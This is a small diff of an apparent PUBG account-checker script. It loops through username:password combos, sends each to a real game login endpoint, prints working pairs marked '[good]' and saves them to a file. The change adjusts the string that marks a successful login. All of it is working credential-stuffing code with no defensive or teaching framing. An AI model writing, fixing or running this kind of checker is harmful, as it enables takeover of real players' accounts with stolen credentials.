@@ -61,7 +61,7 @@ for combo in combos:
         f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=en_US&os=1=sig={token22}",
         data=data2, headers=headers2)
     d += 1
-    if "nginx" in r2.text:
+    if "An error occurred" in r2.text:
         print(f"\x1b[32;1m[{d}]\x1b[32;1m [good]\x1b[37;1m {user}:{passw} ")
         with open("PUBG_Available.txt", "a") as m:
             m.write(bruted_text)
